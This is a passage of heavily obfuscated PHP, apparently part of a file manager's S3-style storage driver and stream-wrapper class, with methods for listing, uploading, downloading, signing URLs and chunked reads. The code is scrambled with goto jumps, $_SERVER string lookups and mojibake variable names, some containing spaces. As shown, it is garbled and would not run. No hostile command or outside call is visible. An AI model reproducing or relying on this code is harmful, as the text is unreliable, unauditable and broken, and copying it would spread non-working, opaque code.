E¸“ĞÈÛ‘“: return array($D˜ÖÈÒó¥ [75] => $AÇ«¾Üì»å, $D˜ÖÈÒó¥ [74] => $cøÊ©‡ÓŒ¯); goto cÑ†ÓÚ±¾‰; cÑ†ÓÚ±¾‰: } private function listObjs($fŒ……©—à¼, $E³ò—æ = null, $CÅô×Çğ‘ì = null, $e¼³‘‹Øì¨ = null) { $C…¿æé¦å¡ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fŒ……©—à¼ = trim($fŒ……©—à¼, $C…¿æé¦å¡[8]); $FŠ¯‡…àøì = empty($fŒ……©—à¼) && $fŒ……©—à¼ !== $C…¿æé¦å¡[191] ? $C…¿æé¦å¡[33] : $fŒ……©—à¼ . $C…¿æé¦å¡[8]; return $this->client->getBucket($this->bucket, $FŠ¯‡…àøì, $E³ò—æ, $CÅô×Çğ‘ì, $e¼³‘‹Øì¨, !0); } public function has($d†ÊÛ–¾ÉÃ, $dƒ†æ†ˆè = false, $f¹·İ¡¬¬ = true) { goto BªĞ†ˆã‚ ; C¾Å§ëŠöæ: $Dš¥î´Š§ˆ = null; $BÛÛÈ‚¶Ê… = 500; $aÕ…‹ ÆÕ¬ = $B¡İ­òÈåŠ[8]; goto e˜³Úˆ™ôÇ; e˜³Úˆ™ôÇ: $DÂóÂÏĞÃï = $dÕÖä•ğ¶¤ = array(); while (!0) { $e…ŠíšîéÖ = $this->listObjs($d†ÊÛ–¾ÉÃ, $Dš¥î´Š§ˆ, $BÛÛÈ‚¶Ê…, $aÕ…‹ ÆÕ¬); if (!$e…ŠíšîéÖ) { break; } $Dš¥î´Š§ˆ = $e…ŠíšîéÖ[$B¡İ­òÈåŠ[202]]; $bÂÒßÎ¹‚® = $e…ŠíšîéÖ[$B¡İ­òÈåŠ[198]]; $eÃˆ’Ëë³ß = $e…ŠíšîéÖ[$B¡İ­òÈåŠ[201]]; if (empty($bÂÒßÎ¹‚®) && empty($eÃˆ’Ëë³ß)) { break; } if (count($bÂÒßÎ¹‚®) == 1 && $bÂÒßÎ¹‚®[0][$B¡İ­òÈåŠ[28]] == $b•é°¸ ’•) { break; } if ($dƒ†æ†ˆè) { if (count($bÂÒßÎ¹‚®)) { $bÂÒßÎ¹‚® = array_column($bÂÒßÎ¹‚®, $B¡İ­òÈåŠ[28]); $DÂóÂÏĞÃï = array_merge($DÂóÂÏĞÃï, $bÂÒßÎ¹‚®); } if (count($eÃˆ’Ëë³ß)) { $eÃˆ’Ëë³ß = array_column($eÃˆ’Ëë³ß, $B¡İ­òÈåŠ[28]); $dÕÖä•ğ¶¤ = array_merge($dÕÖä•ğ¶¤, $eÃˆ’Ëë³ß); } if ($Dš¥î´Š§ˆ === null) { break; } continue; } if ($f¹·İ¡¬¬) { if (!empty($bÂÒßÎ¹‚®)) { if (count($bÂÒßÎ¹‚®) > 1 || isset($bÂÒßÎ¹‚®[0][$B¡İ­òÈåŠ[28]]) && $bÂÒßÎ¹‚®[0][$B¡İ­òÈåŠ[28]] != $b•é°¸ ’•) { return !0; } } } else { if (!empty($eÃˆ’Ëë³ß)) { return !0; } } if ($Dš¥î´Š§ˆ === null) { break; } } if ($dƒ†æ†ˆè) { $DÂóÂÏĞÃï = array_diff($DÂóÂÏĞÃï, array($b•é°¸ ’•)); $DÂóÂÏĞÃï = count(array_unique($DÂóÂÏĞÃï)); $dÕÖä•ğ¶¤ = count(array_unique($dÕÖä•ğ¶¤)); return array($B¡İ­òÈåŠ[203] => $DÂóÂÏĞÃï, $B¡İ­òÈåŠ[204] => $dÕÖä•ğ¶¤); } goto A´î°æ¤”; BªĞ†ˆã‚ : $B¡İ­òÈåŠ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d†ÊÛ–¾ÉÃ = trim($d†ÊÛ–¾ÉÃ, $B¡İ­òÈåŠ[8]); $b•é°¸ ’• = empty($d†ÊÛ–¾ÉÃ) && $d†ÊÛ–¾ÉÃ !== $B¡İ­òÈåŠ[191] ? $B¡İ­òÈåŠ[33] : $d†ÊÛ–¾ÉÃ . $B¡İ­òÈåŠ[8]; goto C¾Å§ëŠöæ; A´î°æ¤”: return !1; goto A´ñêËôÀ½; A´ñêËôÀ½: } public function listAll($FŒÅ‚¨¶¡î) { $dÅé‡´¢¾ó =& $_SERVER[ÒÆ›ÆØÎ¾]; $c‡“ß§¥”÷ = $this->fileList($FŒÅ‚¨¶¡î, $dÅé‡´¢¾ó[33], !0); $eœ‘à½óË× = array(); foreach ($c‡“ß§¥”÷[$dÅé‡´¢¾ó[74]] as $EŒˆß†«šŠ) { $eœ‘à½óË×[$EŒˆß†«šŠ[$dÅé‡´¢¾ó[28]]] = $EŒˆß†«šŠ[$dÅé‡´¢¾ó[78]]; } foreach ($c‡“ß§¥”÷[$dÅé‡´¢¾ó[75]] as $EŒˆß†«šŠ) { if (is_string($EŒˆß†«šŠ)) { $eœ‘à½óË×[$EŒˆß†«šŠ] = 0; } } return $this->listAllFiles($FŒÅ‚¨¶¡î, array_keys($eœ‘à½óË×), $eœ‘à½óË×); } public function canRead($c³“±‚¦“í) { $D´ö†õ·›Á =& $_SERVER[ÒÆ›ÆØÎ¾]; $Eã×èÚµôè = $this->client->getAccessControlPolicy($this->bucket, $c³“±‚¦“í); if (!$Eã×èÚµôè) { return !1; } return in_array($Eã×èÚµôè, array($D´ö†õ·›Á[205], $D´ö†õ·›Á[206], $D´ö†õ·›Á[207])) ? !0 : !1; } public function canWrite($bÃèŞ™…ô) { $Có¸³’á™Ò =& $_SERVER[ÒÆ›ÆØÎ¾]; $c›Äê—®Æí = $this->client->getAccessControlPolicy($this->bucket, $bÃèŞ™…ô); if (!$c›Äê—®Æí) { return !1; } return in_array($c›Äê—®Æí, array($Có¸³’á™Ò[205], $Có¸³’á™Ò[206])) ? !0 : !1; } public function getContent($f»ì†¶ˆß°) { return $this->client->getObject($this->bucket, $f»ì†¶ˆß°); } public function setContent($FÕîÖÖ°Œ, $Fèñ™µíÜ¼ = '', $c˜èŒ¿¾øš = false) { goto B¾¾‰‚§×; aùÂç»§•¼: $this->cacheMethod(null, null); $e‚Œùø¤ = $this->copyFile($FÕîÖÖ°Œ, $FÕîÖÖ°Œ, array($AÚƒÔ÷¬…¶[208] => $e‚Œùø¤[$AÚƒÔ÷¬…¶[209]])); return $e‚Œùø¤ ? !0 : !1; goto FŠßÒˆ…½Å; dŸÒ½´Áò: $e‚Œùø¤ = $this->client->putObject($Fèñ™µíÜ¼, $this->bucket, $FÕîÖÖ°Œ, $AÚƒÔ÷¬…¶[192], array(), $d…“º¨‘É); if (!$e‚Œùø¤) { return !1; } if ($c˜èŒ¿¾øš) { return !0; } goto aùÂç»§•¼; B¾¾‰‚§×: $AÚƒÔ÷¬…¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÕîÖÖ°Œ = $c˜èŒ¿¾øš ? trim($FÕîÖÖ°Œ, $AÚƒÔ÷¬…¶[8]) . $AÚƒÔ÷¬…¶[8] : $FÕîÖÖ°Œ; $d…“º¨‘É = get_file_mime(get_path_ext($FÕîÖÖ°Œ)); goto dŸÒ½´Áò; FŠßÒˆ…½Å: } public function fileSubstr($Cùê‹‰êÔ’, $b’ññÑ©é˜, $d˜°˜˜Àõ) { $f‘¼Ãöë¥ = $b’ññÑ©é˜ + $d˜°˜˜Àõ - 1; return $this->client->getObject($this->bucket, $Cùê‹‰êÔ’, array($_SERVER[ÒÆ›ÆØÎ¾][210] => "\142\171\x74\145\163\75{$b’ññÑ©é˜}\x2d{$f‘¼Ãöë¥}")); } public function upload($c—‚¸’±å, $c¢î”àÊó©, $Aí„Â„ô = false, $FÓŸæ‡®¨¥ = REPEAT_REPLACE) { $fê§²·¥ïÍ =& $_SERVER[ÒÆ›ÆØÎ¾]; $cé§¯¿ªÁÃ = array($fê§²·¥ïÍ[208] => @md5_file($c¢î”àÊó©)); $aĞõóá¼İ = array($fê§²·¥ïÍ[211] => get_file_mime(get_path_ext($c—‚¸’±å))); if (IO::size($c¢î”àÊó©) <= 1024 * 1024 * 200) { $B¤÷‚É¢”ß = $this->client->putObjectFile($c¢î”àÊó©, $this->bucket, $c—‚¸’±å, $fê§²·¥ïÍ[192], $cé§¯¿ªÁÃ, $aĞõóá¼İ); return !empty($B¤÷‚É¢”ß) ? $this->getPathOuter($c—‚¸’±å) : !1; } $fĞ’ØÑÎ¢¹ = $this->client->multiUploadObject($c¢î”àÊó©, $this->bucket, trim($c—‚¸’±å, $fê§²·¥ïÍ[8]), $cé§¯¿ªÁÃ, $aĞõóá¼İ); return $fĞ’ØÑÎ¢¹ ? $this->getPathOuter($c—‚¸’±å) : !1; } public function download($Bã×…ëÆ²©, $EÓì®Áïòø) { if (!@is_dir($this->pathFather($EÓì®Áïòø)) && !IO::mkdir($this->pathFather($EÓì®Áïòø))) { return !1; } $a’«ˆéƒù‘ = $this->client->getObject($this->bucket, $Bã×…ëÆ²©, array(), $EÓì®Áïòø); return $a’«ˆéƒù‘ !== !1 ? $EÓì®Áïòø : !1; } public function link($f¤³«Õéà, $e‚Ÿóğò¿ = array()) { $f„°»…Í„Û =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->signVer == $f„°»…Í„Û[212]) { return $this->client->getAuthenticatedURL($this->bucket, $f¤³«Õéà, 3600 * 12, $e‚Ÿóğò¿); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($f¤³«Õéà, $f„°»…Í„Û[8]), 3600 * 12, $this->region, array(), !0, $e‚Ÿóğò¿); } public function fileOut($Fƒ˜ƒŒÊ¥¶, $C§åõ›ß­„ = false, $D‚½ñ¯–è = false, $eˆŠáÌöŸ = '') { goto B§óÚŸ‹ê; BˆÑÙ†–ª: $a…‰‚ëœ¿¯ = array($fÜ±Ä–é‰[216] => $C§åõ›ß­„ . $fÜ±Ä–é‰[217] . rawurlencode($D‚½ñ¯–è), $fÜ±Ä–é‰[218] => $D•¬Î™øˆ); $CÔØÀâŠáƒ = $this->link($Fƒ˜ƒŒÊ¥¶, $a…‰‚ëœ¿¯); $this->fileOutLink($CÔØÀâŠáƒ); goto E¼‚’Ùó½; bÑÁÍ¿Ú¶æ: $D•¬Î™øˆ = get_file_mime(get_path_ext($D‚½ñ¯–è)); if ($D•¬Î™øˆ == $fÜ±Ä–é‰[213]) { return parent::fileOut($Fƒ˜ƒŒÊ¥¶, $C§åõ›ß­„, $D‚½ñ¯–è, $eˆŠáÌöŸ); } $C§åõ›ß­„ = $C§åõ›ß­„ ? $fÜ±Ä–é‰[214] : $fÜ±Ä–é‰[215]; goto BˆÑÙ†–ª; B§óÚŸ‹ê: $fÜ±Ä–é‰ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->isFileOutServer()) { return $this->fileOutServer($Fƒ˜ƒŒÊ¥¶, $C§åõ›ß­„, $D‚½ñ¯–è, $eˆŠáÌöŸ); } if (!$D‚½ñ¯–è) { $D‚½ñ¯–è = $this->pathThis($Fƒ˜ƒŒÊ¥¶); } goto bÑÁÍ¿Ú¶æ; E¼‚’Ùó½: } public function fileOutServer($CÊ”ÂŒØ¸˜, $C§â»ƒØé = false, $f©½‡»ùªè = false, $DÙ—Âéí¼Ô = '') { parent::fileOut($CÊ”ÂŒØ¸˜, $C§â»ƒØé, $f©½‡»ùªè, $DÙ—Âéí¼Ô); } public function fileOutImageServer($fŒå½ãÉŞ“, $cï›èÀİ¬„ = 250) { parent::fileOutImage($fŒå½ãÉŞ“, $cï›èÀİ¬„); } public function hashMd5($D¿ŠÎ±¡î·, $dÙÑ‹í‰ø = '') { $f§Äà¨êèÎ =& $_SERVER[ÒÆ›ÆØÎ¾]; $A‹İ®õØ®› = $this->objectMeta($D¿ŠÎ±¡î·); if (!$A‹İ®õØ®›) { return !1; } $dÙÑ‹í‰ø = $dÙÑ‹í‰ø ? $dÙÑ‹í‰ø : _get($A‹İ®õØ®›, $f§Äà¨êèÎ[219]); $dÙÑ‹í‰ø = $dÙÑ‹í‰ø ? $dÙÑ‹í‰ø : _get($A‹İ®õØ®›, $f§Äà¨êèÎ[209], $f§Äà¨êèÎ[33]); return $dÙÑ‹í‰ø; } public function uploadFormData($F¸Ê¼ñ®ßĞ, $CÔä‡Œ³‰å = 3600) { $f§‚©ÆÂñ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bíâ‡¼æ¿ğ = $this->pathFather($F¸Ê¼ñ®ßĞ); $c®®ğ…ù”‘ = $this->client->getHttpUploadPostParams($this->bucket, $bíâ‡¼æ¿ğ, $f§‚©ÆÂñ[192], $CÔä‡Œ³‰å); return array_merge((array) $c®®ğ…ù”‘, array($f§‚©ÆÂñ[175] => $this->getHost())); } public function multiUploadFormData($fï©–»Â×º, $C©êİåÚª› = 3600) { $aØ‡äÂ×£ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E“˜â¥†ƒ¾ = gmdate($aØ‡äÂ×£[220]); $aíŠ¸—êÛ¯ = array(); $dÌ„œ‰¿‹° = $this->client->getUploadId($this->bucket, $fï©–»Â×º, $aíŠ¸—êÛ¯); if (!$dÌ„œ‰¿‹°) { return !1; } return array($aØ‡äÂ×£[221] => $dÌ„œ‰¿‹°, $aØ‡äÂ×£[175] => $this->getHost() . $aØ‡äÂ×£[8] . $this->pathEncode($fï©–»Â×º), $aØ‡äÂ×£[222] => $E“˜â¥†ƒ¾, $aØ‡äÂ×£[93] => $fï©–»Â×º); } public function multiUploadAuthData($fÌÄ°ƒ÷”˜, $Eö’ÊŸÔ½½ = array()) { goto cóùì‡ğêç; E†ÃåÀÍ‚: $d“µ–î³ = implode($aƒ½Ú¼Ê•¶[229], $A·Í¥ÜÄÈ); $FˆìÓ–èŞ« = base64_encode(hash_hmac($aƒ½Ú¼Ê•¶[230], $d“µ–î³, $this->secret, !0)); $C÷œ•˜æ = $aƒ½Ú¼Ê•¶[231] . $this->accessKey . $aƒ½Ú¼Ê•¶[4] . $FˆìÓ–èŞ«; goto CÙ¥¤óãÉæ; cóùì‡ğêç: $aƒ½Ú¼Ê•¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fŒ¯­£Ï¹æ = isset($Eö’ÊŸÔ½½[$aƒ½Ú¼Ê•¶[222]]) ? $Eö’ÊŸÔ½½[$aƒ½Ú¼Ê•¶[222]] : gmdate($aƒ½Ú¼Ê•¶[220]); $A›õô–òÉ = isset($Eö’ÊŸÔ½½[$aƒ½Ú¼Ê•¶[168]]) ? $Eö’ÊŸÔ½½[$aƒ½Ú¼Ê•¶[168]] : $aƒ½Ú¼Ê•¶[33]; goto CêÉ¦åÁª¹; CêÉ¦åÁª¹: $EÑ‹”«Ç©† = $Eö’ÊŸÔ½½[$aƒ½Ú¼Ê•¶[93]]; unset($Eö’ÊŸÔ½½[$aƒ½Ú¼Ê•¶[93]]); if (isset($Eö’ÊŸÔ½½[$aƒ½Ú¼Ê•¶[223]])) { $Eö’ÊŸÔ½½[$aƒ½Ú¼Ê•¶[222]] = $fŒ¯­£Ï¹æ; return $this->listUploadParts($EÑ‹”«Ç©†, $Eö’ÊŸÔ½½); } goto C¡“³ƒ¾º; C¡“³ƒ¾º: $A·Í¥ÜÄÈ = array($aƒ½Ú¼Ê•¶[224], $aƒ½Ú¼Ê•¶[33], $aƒ½Ú¼Ê•¶[119], $aƒ½Ú¼Ê•¶[33], "\170\55\x61\x6d\x7a\55\144\141\164\145\72{$fŒ¯­£Ï¹æ}", $aƒ½Ú¼Ê•¶[8] . $this->bucket . $aƒ½Ú¼Ê•¶[8] . $this->pathEncode($EÑ‹”«Ç©†) . $A›õô–òÉ); if (strpos($A›õô–òÉ, $aƒ½Ú¼Ê•¶[225]) === 0) { $A·Í¥ÜÄÈ[0] = $aƒ½Ú¼Ê•¶[226]; } if (isset($Eö’ÊŸÔ½½[$aƒ½Ú¼Ê•¶[227]]) && $Eö’ÊŸÔ½½[$aƒ½Ú¼Ê•¶[227]] == $aƒ½Ú¼Ê•¶[228]) { $A·Í¥ÜÄÈ[0] = $aƒ½Ú¼Ê•¶[228]; } goto E†ÃåÀÍ‚; CÙ¥¤óãÉæ: if (strpos($A›õô–òÉ, $aƒ½Ú¼Ê•¶[225]) === 0) { return array($aƒ½Ú¼Ê•¶[232] => $C÷œ•˜æ, $aƒ½Ú¼Ê•¶[222] => $fŒ¯­£Ï¹æ); } return $C÷œ•˜æ; goto c¸çÚ³Û÷Ä; c¸çÚ³Û÷Ä: } public function listUploadParts($Bî×†¤ì¤Ô, $Dïğìˆ‘¢ = array()) { goto DŠšÃ‘Æ¥¢; Fø«¡Íš¬Ö: if (!$EÆÓóî…„†) { return !1; } unset($Dïğìˆ‘¢[$aÉì¹‡¨†[223]], $Dïğìˆ‘¢[$aÉì¹‡¨†[227]]); $Dïğìˆ‘¢[$aÉì¹‡¨†[93]] = $Bî×†¤ì¤Ô; goto AÌ¯ŒóáõÜ; DŠšÃ‘Æ¥¢: $aÉì¹‡¨† =& $_SERVER[ÒÆ›ÆØÎ¾]; $bàˆÍ§¯Œœ = str_replace($aÉì¹‡¨†[233], $aÉì¹‡¨†[33], $Dïğìˆ‘¢[$aÉì¹‡¨†[168]]); $EÆÓóî…„† = $this->client->listParts($this->bucket, $Bî×†¤ì¤Ô, $bàˆÍ§¯Œœ); goto Fø«¡Íš¬Ö; AÌ¯ŒóáõÜ: $D¡ÅëÌ… = $this->multiUploadAuthData($Bî×†¤ì¤Ô, $Dïğìˆ‘¢); if (empty($D¡ÅëÌ…)) { return !1; } return array($aÉì¹‡¨†[232] => $D¡ÅëÌ…, $aÉì¹‡¨†[222] => $Dïğìˆ‘¢[$aÉì¹‡¨†[222]], $aÉì¹‡¨†[234] => $EÆÓóî…„†); goto B‹Ò¡±Õ; B‹Ò¡±Õ: } public function getHost() { return parent::getHost() . $_SERVER[ÒÆ›ÆØÎ¾][8] . $this->bucket; } public function size($FêŸØæÇ»†) { $cŞÎ·À©Á = $this->objectMeta($FêŸØæÇ»†); return $cŞÎ·À©Á ? $cŞÎ·À©Á[$_SERVER[ÒÆ›ÆØÎ¾][78]] : 0; } public function info($aÜêÂš˜Ë¼) { if ($this->isFolder($aÜêÂš˜Ë¼)) { return $this->folderInfo($aÜêÂš˜Ë¼); } else { if ($this->isFile($aÜêÂš˜Ë¼)) { return $this->fileInfo($aÜêÂš˜Ë¼); } } return !1; } public function exist($b™ô½¯®õ) { return $this->isFile($b™ô½¯®õ) || $this->isFolder($b™ô½¯®õ); } public function isFile($b×ÁŞ¸ğé) { return !$this->isFolder($b×ÁŞ¸ğé) && $this->objectMeta($b×ÁŞ¸ğé); } public function isFolder($fóÅ”Ğä·×) { return $this->cacheMethod($_SERVER[ÒÆ›ÆØÎ¾][199], $fóÅ”Ğä·×); } protected function objectMeta($aóÌİÄ¸ô…) { return $this->cacheMethod($_SERVER[ÒÆ›ÆØÎ¾][200], $aóÌİÄ¸ô…); } protected function _objectMeta($cã»ß¾ğ¹‚) { $dÜõ§°×¿• =& $_SERVER[ÒÆ›ÆØÎ¾]; $cã»ß¾ğ¹‚ = rtrim($cã»ß¾ğ¹‚, $dÜõ§°×¿•[8]); try { $c°ÂàÊö¡‘ = $this->client->getObjectInfo($this->bucket, $cã»ß¾ğ¹‚); if (!isset($c°ÂàÊö¡‘[$dÜõ§°×¿•[219]]) && isset($c°ÂàÊö¡‘[$dÜõ§°×¿•[235]])) { $c°ÂàÊö¡‘[$dÜõ§°×¿•[219]] = $c°ÂàÊö¡‘[$dÜõ§°×¿•[235]]; } } catch (Exception $FÛŒÍ¦ºØø) { $c°ÂàÊö¡‘ = !1; } if (!$c°ÂàÊö¡‘) { } return $c°ÂàÊö¡‘; } protected function _isFolder($d¦Ä¸ĞÏä·) { goto eÍƒÅººÌ‘; C›ÒîÏÔÖò: $bÖ»ÎÌš¸ô = $this->client->getBucket($this->bucket, $d¦Ä¸ĞÏä·, null, 1); if (empty($bÖ»ÎÌš¸ô[$c…Í“ß—ã¡[198]])) { return !1; } $d÷Ùë‡Æ§ = $bÖ»ÎÌš¸ô[$c…Í“ß—ã¡[198]][0][$c…Í“ß—ã¡[28]]; goto Aµ¿µÜë¤¨; Aµ¿µÜë¤¨: return stripos($d÷Ùë‡Æ§, $d¦Ä¸ĞÏä· . $c…Í“ß—ã¡[8]) === 0 ? !0 : !1; if (substr($d÷Ùë‡Æ§, -1) == $c…Í“ß—ã¡[8]) { return !0; } if (get_path_this($d÷Ùë‡Æ§) == get_path_this($d¦Ä¸ĞÏä·)) { return !1; } goto Ağ„åÌšİ; eÍƒÅººÌ‘: $c…Í“ß—ã¡ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d¦Ä¸ĞÏä· = rtrim($d¦Ä¸ĞÏä·, $c…Í“ß—ã¡[8]); if ($d¦Ä¸ĞÏä· == $c…Í“ß—ã¡[33] || $d¦Ä¸ĞÏä· == $c…Í“ß—ã¡[8]) { return !0; } goto C›ÒîÏÔÖò; Ağ„åÌšİ: return !0; goto FŠîÜãöå†; FŠîÜãöå†: } } define($_SERVER[ÒÆ›ÆØÎ¾][236], 1); goto EãøƒÖ„™ñ; FøÒ½š‰Ï¦: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($eá¢¼ÒÇÆ, $e°ãœõ¼‹Ÿ = '') { goto dŒ‚»“Ïö¥; dŒ‚»“Ïö¥: $this->info = $this->info($eá¢¼ÒÇÆ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÒÆ›ÆØÎ¾][76]]; goto CŠù×œšœ; F®É¥¶ˆæ—: if (!isset(self::$_chunkBuffer[$eá¢¼ÒÇÆ])) { self::$_chunkBuffer[$eá¢¼ÒÇÆ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto c”ò®“÷²Ç; CŠù×œšœ: $this->pathOpen = $eá¢¼ÒÇÆ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto F®É¥¶ˆæ—; c”ò®“÷²Ç: } function stream_read($AÄ’”ÉŒ) { $fß¯ÄóÏ… = $this->fileSubstr($this->pose, $AÄ’”ÉŒ); $this->pose += strlen($fß¯ÄóÏ…); return $fß¯ÄóÏ…; } public function stream_tell() { return $this->pose; } public function stream_seek($aÉËÁò¶£ª, $C¤åî»Ã¡†) { $a¨‘·Ô¾Ëê =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($C¤åî»Ã¡† == SEEK_SET) { $this->pose = $aÉËÁò¶£ª; } else { if ($C¤åî»Ã¡† == SEEK_CUR) { $this->pose += $aÉËÁò¶£ª; } else { if ($C¤åî»Ã¡† == SEEK_END) { $this->pose = $this->info[$a¨‘·Ô¾Ëê[78]] + intval($aÉËÁò¶£ª); } } } if ($aÉËÁò¶£ª < 0) { $this->pose = $this->info[$a¨‘·Ô¾Ëê[78]] + $aÉËÁò¶£ª; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÒÆ›ÆØÎ¾][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($cá¡â¨×İ, $B·’ÁŞ‰§ï) { $bµø¥’Ÿ… =& $_SERVER[ÒÆ›ÆØÎ¾]; $C·ê¢êÛ†  = $this->info($cá¡â¨×İ); return array($bµø¥’Ÿ…[1371] => 0, $bµø¥’Ÿ…[1372] => 0, $bµø¥’Ÿ…[12] => 32768 + 511, $bµø¥’Ÿ…[1373] => 0, $bµø¥’Ÿ…[1374] => 0, $bµø¥’Ÿ…[1375] => 0, $bµø¥’Ÿ…[1376] => 0, $bµø¥’Ÿ…[78] => $C·ê¢êÛ† [$bµø¥’Ÿ…[78]], $bµø¥’Ÿ…[1377] => $C·ê¢êÛ† [$bµø¥’Ÿ…[1246]], $bµø¥’Ÿ…[1333] => $C·ê¢êÛ† [$bµø¥’Ÿ…[84]], $bµø¥’Ÿ…[1332] => $C·ê¢êÛ† [$bµø¥’Ÿ…[194]], $bµø¥’Ÿ…[1378] => 0, $bµø¥’Ÿ…[1379] => 0); } static $fileInfo = array(); public function info($EË¶©«‰“æ) { $eÀˆ¶”Éë½ = $_SERVER[ÒÆ›ÆØÎ¾][1380]; if (isset(self::$fileInfo[$EË¶©«‰“æ])) { return self::$fileInfo[$EË¶©«‰“æ]; } if (substr($EË¶©«‰“æ, 0, strlen($eÀˆ¶”Éë½)) != $eÀˆ¶”Éë½) { return !1; } self::$fileInfo[$EË¶©«‰“æ] = IO::info(substr($EË¶©«‰“æ, strlen($eÀˆ¶”Éë½))); return self::$fileInfo[$EË¶©«‰“æ]; } public static function read($e×²³ˆÃĞŠ, $eÌÖšÜğÄŒ, $b¡Ì›÷ÇÛ) { if (!isset(self::$_fopenCache[$e×²³ˆÃĞŠ])) { $fÙ‰¿³³İ… = new StreamWrapperIO(); $fÙ‰¿³³İ…->stream_open($e×²³ˆÃĞŠ); self::$_fopenCache[$e×²³ˆÃĞŠ] = $fÙ‰¿³³İ…; } $fÙ‰¿³³İ… = self::$_fopenCache[$e×²³ˆÃĞŠ]; return $fÙ‰¿³³İ…->fileSubstr($eÌÖšÜğÄŒ, $b¡Ì›÷ÇÛ); } public static function _read($f¼ŒÃß›Ê, $B†àµ–Ï÷, $BŸõ‘Åµ›) { goto DÜˆ‡šáÃÎ; d‘ÜÂŞ•©†: $f¢äøŞ—±Ğ = 8192; fseek($EèÓĞó˜„, $B†àµ–Ï÷, SEEK_SET); $e¾ô²ÀŸÔ = $b…›ƒ…‚¢[33]; goto béµ¬õ¸›±; DÜˆ‡šáÃÎ: $b…›ƒ…‚¢ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EèÓĞó˜„ = fopen($f¼ŒÃß›Ê, $b…›ƒ…‚¢[1250]); if (!$EèÓĞó˜„) { return $b…›ƒ…‚¢[33]; } goto d‘ÜÂŞ•©†; béµ¬õ¸›±: $f“Í¨’äÀˆ = 0; while ($f“Í¨’äÀˆ < $BŸõ‘Åµ›) { $D¾Ì¯ÜéÜ¥ = min($f¢äøŞ—±Ğ, $BŸõ‘Åµ› - $f“Í¨’äÀˆ); $e¾ô²ÀŸÔ .= fread($EèÓĞó˜„, $D¾Ì¯ÜéÜ¥); $f“Í¨’äÀˆ += $D¾Ì¯ÜéÜ¥; } fclose($EèÓĞó˜„); goto EßÕ²‰—‘Ó; EßÕ²‰—‘Ó: return $e¾ô²ÀŸÔ; goto dª…ÄÓéÔ; dª…ÄÓéÔ: } public function fileSubstr($d·›öÛŸæŒ, $F¡º‹³Ş´³) { goto BĞÕ¹¾ê´; C¾²»ó»é¶: $EÑÄĞ‰¾Ù¶ = $F¡º‹³Ş´³; if ($d·›öÛŸæŒ < 0) { $d·›öÛŸæŒ = $c¸ç¡Æ‚‚¡ + $d·›öÛŸæŒ; } if ($F¡º‹³Ş´³ === !1) { $F¡º‹³Ş´³ = $c¸ç¡Æ‚‚¡ - $d·›öÛŸæŒ; } goto dÔØÄì—µĞ; F®’Ëˆ×·°: foreach ($F”¸—‰Œ¯° as $aòË¡ç—ç => $Eè¹ÓÀÔ¢É) { $aòË¡ç—ç = intval($aòË¡ç—ç); $FƒŞÉÍ¸µŠ = $aòË¡ç—ç + strlen($Eè¹ÓÀÔ¢É); if ($d·›öÛŸæŒ >= $FƒŞÉÍ¸µŠ) { continue; } if ($d·›öÛŸæŒ >= $aòË¡ç—ç && $d·›öÛŸæŒ + $F¡º‹³Ş´³ <= $FƒŞÉÍ¸µŠ) { return substr($Eè¹ÓÀÔ¢É, $d·›öÛŸæŒ - $aòË¡ç—ç, $F¡º‹³Ş´³); } break; } if (count($F”¸—‰Œ¯°) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($F‹‘¶¸º´õ[1381], $F‹‘¶¸º´õ[1382] . count($F”¸—‰Œ¯°) . "\x3b\x73\164\x61\162\x74\75{$d·›öÛŸæŒ}\x2c\x6c\145\156\x67\x74\150\x3d{$F¡º‹³Ş´³}\73\x70\x6f\163\x65\x3a{$aòË¡ç—ç}\x7e{$FƒŞÉÍ¸µŠ}"); throw new Exception($F‹‘¶¸º´õ[1383]); } $bæ˜Œàğƒ† = intval($d·›öÛŸæŒ / $d“¾©ØÈ‹¹) * $d“¾©ØÈ‹¹; goto a©È¤İ•Ï‚; BĞÕ¹¾ê´: $F‹‘¶¸º´õ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c¸ç¡Æ‚‚¡ = $this->info[$F‹‘¶¸º´õ[78]]; $bñµœ½Ú÷ = $d·›öÛŸæŒ; goto C¾²»ó»é¶; DÕÅ»†Š¼Ğ: ksort($F”¸—‰Œ¯°); $D„„•ö›îñ = substr($b Ãæƒ›Ñá, $d·›öÛŸæŒ - $bæ˜Œàğƒ†, $F¡º‹³Ş´³); return $D„„•ö›îñ; goto B˜òİÌ’Åö; DŸ›ïäÙ¡¤: $aòË¡ç—ç = 0; $FƒŞÉÍ¸µŠ = 0; $Eè¹ÓÀÔ¢É = $F‹‘¶¸º´õ[33]; goto F®’Ëˆ×·°; a©È¤İ•Ï‚: $fŒ±§µ§˜É = ceil(($d·›öÛŸæŒ + $F¡º‹³Ş´³) / $d“¾©ØÈ‹¹) * $d“¾©ØÈ‹¹ - $bæ˜Œàğƒ†; $b Ãæƒ›Ñá = IO::fileSubstr($this->path, $bæ˜Œàğƒ†, $fŒ±§µ§˜É); $F”¸—‰Œ¯°[$bæ˜Œàğƒ† . $F‹‘¶¸º´õ[33]] = $b Ãæƒ›Ñá; goto DÕÅ»†Š¼Ğ; DÁŒìâó”›: $d“¾©ØÈ‹¹ = 64 * 1024; $F”¸—‰Œ¯° =& self::$_chunkBuffer[$this->path]; if (!$F”¸—‰Œ¯°) { 